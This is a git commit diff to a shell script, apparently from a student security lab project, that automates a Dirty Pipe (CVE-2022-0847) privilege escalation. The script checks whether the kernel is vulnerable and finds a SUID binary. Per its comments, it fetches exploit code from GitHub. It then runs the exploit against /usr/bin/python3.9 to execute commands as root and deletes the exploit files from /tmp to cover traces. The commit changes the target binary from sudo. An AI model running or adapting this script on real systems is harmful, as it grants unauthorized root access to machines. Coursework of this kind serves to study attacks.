10700a40c475badc9a5310c4d24d3b9b9bcf3b07
Yang Jun <2000572@sit.singaporetech.edu.sg>
2022-10-22 01:08:15 +0800

    Added installation of syslog and fixed PE

--- Attacks/Privilege_Escalation/dirtypipe.sh
+++ Attacks/Privilege_Escalation/dirtypipe.sh
@@ -20,10 +20,10 @@ if [[ "${notvulnerable[*]}" = $kernel_version ]];
         echo "[+] This kernel version is vulnerable to Dirty Pipe!"
 
         # Checks if /usr/bin/sudo has SUID bit set
-        echo "[*] Checking if SUID bit is set on /usr/bin/sudo..."
-        if [[ "$(find / -perm -4000 2>/dev/null)" =~ "/usr/bin/sudo" ]];
+        echo "[*] Checking if SUID bit is set on /usr/bin/python3.9..."
+        if [[ "$(find / -perm -4000 2>/dev/null)" =~ "/usr/bin/python3.9" ]];
             then
-                echo "[+] SUID bit is set on /usr/bin/sudo!"
+                echo "[+] SUID bit is set on /usr/bin/python3.9!"
 
                 # Grab a copy of the exploit code from GitHub and store it in /tmp directory
                 echo "[*] Grabbing a copy of the exploit code from GitHub..."
@@ -37,12 +37,12 @@ if [[ "${notvulnerable[*]}" = $kernel_version ]];
 
                 # Execute the exploit to get a root shell and run commands. Perform cleanup at the end.
                 echo "[*] Executing the Dirty Pipe exploit to run commands in root shell..."
-                echo "whoami && rm /tmp/sh /tmp/CVE-2022-0847.c /tmp/CVE-2022-0847" | ./CVE-2022-0847 /usr/bin/sudo
+                echo "whoami && rm /tmp/sh /tmp/CVE-2022-0847.c /tmp/CVE-2022-0847" | ./CVE-2022-0847 /usr/bin/python3.9
                 echo "[+] All commands have been executed!"
 
             else
                 # If SUID bit is not set on /usr/bin/sudo, terminate the script
-                echo "[!] SUID bit is not set on /usr/bin/sudo! Terminating script..."
+                echo "[!] SUID bit is not set on /usr/bin/python3.9! Terminating script..."
                 exit 0
         
         fi
